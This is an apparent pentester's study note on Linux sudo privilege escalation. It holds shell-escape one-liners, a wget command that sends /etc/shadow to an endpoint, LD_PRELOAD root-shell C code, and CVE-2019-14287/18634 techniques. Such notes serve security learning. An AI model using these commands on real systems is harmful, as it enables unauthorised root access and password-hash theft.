---
aliases:
  - Linux sudo exploitation
tags:
  - tech
  - cybsec
  - linux
  - privilege_escalation
  - privesc
  - sudo
author: Mehdi N Tehrani
creat_date: 2023-12-18
category: Cyber Security
subcategory: Linux Pentesting
---

# Shell Escaping
#shell_escaping
[GTFOBins](https://gtfobins.github.io/)

for example if vim can be run with sudo without a password; found through `sudo -l`, the following command can put us into a shell with root privileges
`sudo vim -c '!/bin/bash'
or with aws
`sudo awk 'BEGIN {system("/bin/bash")}'`

# Intended Functionality
#sudo_intended_functionality

for example if can run `apache2` with sudo without password, the following let's us view a system file:
`sudo apache2 -f /etc/shadow`

#wget #wget_post
or can use wget to exfiltrate files
`sudo wget --post-file=/etc/shadow <endpoint>`

# LD_PRELOAD
[GTFOBins](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ld_preload-and-nopasswd)
#ld_preload
```
$ sudo -l
Matching Defaults entries for <user> on this host:
    env_reset, env_keep+=LD_PRELOAD

User <user> run the following commands on this host:
    (root) NOPASSWD: /usr/bin/vim
    ...
```

```c
#include <stdlib.h>
#include <sys/types.h>
#include <stdio.h>

int main(){
   unsetenv("LD_PRELOAD");
   setuid(0);
   setgid(0);
   system("/bin/bash");
   return 0;
}
```

```sh
$ gcc -fPIC -shared -o shell.so shell.c
$ LD_PRELOAD=/path/to/shell.so <execurable>
```

# CVE-2019-14287
#sudo #vulnerability #sudo_1_8_27 #cve_2019_14287
`sudo -u#-1 /bin/bash`

an issue with this sudo version where user with id (-1) which doesn't exists causes sudo to crash and return into root shell.


# CVE-2019-18634
#sudo #vulnerability #cve_2019_14287 #pwfeedback #buffer_overflow 
sudo < 1.8.26
**pwfeedback**: asterisks added when typing passwords

![[Pasted image 20231218154309.png]]

Example of a vulnerable sudo:
```
$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

## exploit
https://github.com/saleemrashid/sudo-cve-2019-18634
gcc flags: `-Os -g3 -std=c11 -Wall -Wextra -Wpedantic -static`